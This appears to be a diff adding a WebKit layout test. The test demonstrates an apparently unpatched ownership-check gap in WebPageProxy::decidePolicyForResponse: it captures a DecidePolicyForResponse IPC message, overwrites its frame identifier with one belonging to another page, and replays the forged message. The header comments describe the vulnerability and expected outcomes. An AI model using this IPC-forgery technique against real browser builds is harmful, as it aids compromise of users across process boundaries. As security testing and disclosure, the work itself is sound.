@@ -1,0 +1,144 @@
+<!DOCTYPE html><!-- webkit-test-runner [ IPCTestingAPIEnabled=true ] -->
+<!--
+  Variant of WebKit's own LayoutTests/ipc/decide-policy-for-navigation-action-cross-page-frame.html,
+  which was added by commit e9f94fd4c6 ("[WebKit Process Model] missing sender-ownership validation
+  in 12 process-global identifier-map lookups", bug 315535 / rdar://176814631).
+
+  That commit added MESSAGE_CHECK(frame->page() == this) to twelve DispatchedFrom=WebContent
+  handlers, including three of the four navigation-policy deciders:
+
+      WebPageProxy::decidePolicyForNavigationActionAsync   patched
+      WebPageProxy::decidePolicyForNavigationActionSync    patched
+      WebPageProxy::decidePolicyForNewWindowAction         patched
+      WebPageProxy::decidePolicyForResponse                NOT patched   <-- this test
+
+  decidePolicyForResponse / decidePolicyForResponseShared still resolve the WebContent-supplied
+  frameInfo.frameID through the process-global WebFrameProxy::webFrame() map and operate on the
+  result (setUpPolicyListenerProxy, and on the main-frame path mainFrame()->disownOpener()) with
+  only MESSAGE_CHECK_URL_COMPLETION on the two URLs and no ownership check.
+
+  CONTROL: run WebKit's own decide-policy-for-navigation-action-cross-page-frame.html unmodified.
+  It exercises the identical forgery through a *patched* handler and must be rejected.
+
+  EXPECTED
+    * vulnerable (current main): the forged message is accepted, the WebContent process is NOT
+      terminated, and the foreign frame is operated on. The test finishes and prints its text.
+    * fixed:                     MESSAGE_CHECK rejects it and the WebContent process is terminated,
+                                 so run-webkit-tests reports a crash instead of the text below.
+
+  The difference between this file's outcome and the control's is the entire finding.
+-->
+<html>
+<head>
+<script>
+if (window.testRunner) {
+    testRunner.dumpAsText();
+    testRunner.waitUntilDone();
+}
+
+// Output must be deterministic for -expected.txt, so no identifiers are printed.
+let status = "no-ipc";
+
+function done() {
+    document.body.innerText =
+        "DecidePolicyForResponse cross-page frame replay: " + status + "\n" +
+        "A WebContent process that sends DecidePolicyForResponse naming a different " +
+        "WebPageProxy's WebFrameProxy must be rejected by MESSAGE_CHECK before the foreign " +
+        "frame is touched.";
+    if (window.testRunner)
+        testRunner.notifyDone();
+}
+
+function findUint64LE(u8, val) {
+    const lo = Number(val & 0xFFFFFFFFn);
+    const hi = Number((val >> 32n) & 0xFFFFFFFFn);
+    let hits = [];
+    for (let i = 0; i + 8 <= u8.length; i++) {
+        const a = u8[i] | (u8[i+1]<<8) | (u8[i+2]<<16) | (u8[i+3]<<24);
+        const b = u8[i+4] | (u8[i+5]<<8) | (u8[i+6]<<16) | (u8[i+7]<<24);
+        if ((a >>> 0) === (lo >>> 0) && (b >>> 0) === (hi >>> 0))
+            hits.push(i);
+    }
+    return hits;
+}
+
+function writeUint64LE(u8, off, val) {
+    for (let i = 0; i < 8; i++)
+        u8[off+i] = Number((val >> BigInt(8*i)) & 0xFFn);
+}
+
+let captured = null;
+let capturedDestID = null;
+
+async function main() {
+    if (!window.IPC)
+        return done();
+    status = "not-captured";
+
+    const senderFrameID = BigInt(IPC.frameID[0]);
+
+    // A second WebPageProxy, so the frame we name belongs to a different page.
+    const targetWin = window.open("resources/cross-page-target.html", "_blank");
+    await new Promise(r => setTimeout(r, 300));
+
+    let targetFrameID;
+    try {
+        targetFrameID = BigInt(targetWin.IPC.frameID[0]);
+    } catch (e) {
+        // FrameIdentifiers are sequential integers minted in the UIProcess -- per the commit
+        // message for e9f94fd4c6, that guessability is the premise of the whole bug class.
+        targetFrameID = (senderFrameID & 0xFFFFFFFF00000000n) | ((senderFrameID & 0xFFFFFFFFn) + 1n);
+    }
+    if (targetFrameID === senderFrameID)
+        return done();
+
+    const ifr = document.createElement("iframe");
+    ifr.src = "about:blank";
+    document.body.appendChild(ifr);
+    await new Promise(r => setTimeout(r, 100));
+    const iframeFrameID = BigInt(ifr.contentWindow.IPC.frameID[0]);
+
+    const msgName = IPC.messages.WebPageProxy_DecidePolicyForResponse.name;
+    IPC.addOutgoingMessageListener("UI", (m) => {
+        if (m.name === msgName && !captured) {
+            captured = m.buffer.slice(0);
+            capturedDestID = m.destinationID;
+        }
+    });
+
+    // A response policy decision is only taken for a load that actually produces a response, so
+    // navigate to a real resource rather than about:blank or a data: URL.
+    ifr.src = "resources/cross-page-target.html?r=" + Date.now();
+    for (let i = 0; i < 100 && !captured; i++)
+        await new Promise(r => setTimeout(r, 20));
+    if (!captured)
+        return done();
+
+    // frameInfo is the first argument of DecidePolicyForResponse, so its frameID appears early in
+    // the body -- unlike DecidePolicyForNavigationActionAsync, where the upstream test patches the
+    // LAST occurrence. FrameInfoData also carries parentFrameID, so rather than guessing which
+    // occurrence is which, replay once per candidate offset. Nothing rejects the message on a
+    // vulnerable build, so the extra replays are harmless.
+    const original = new Uint8Array(captured).slice(16);   // strip the 16-byte IPC header
+    const hits = findUint64LE(original, iframeFrameID);
+    if (!hits.length)
+        return done();
+
+    for (const off of hits) {
+        const body = original.slice(0);
+        writeUint64LE(body, off, targetFrameID);
+        IPC.sendMessage("UI", capturedDestID, msgName, body);
+        await new Promise(r => setTimeout(r, 100));
+    }
+
+    // Reaching this line at all means the UIProcess did not kill us for naming a foreign frame.
+    status = "accepted-not-terminated";
+    await new Promise(r => setTimeout(r, 300));
+    done();
+}
+
+window.onload = () => { main().catch(done); };
+</script>
+</head>
+<body></body>
+</html>
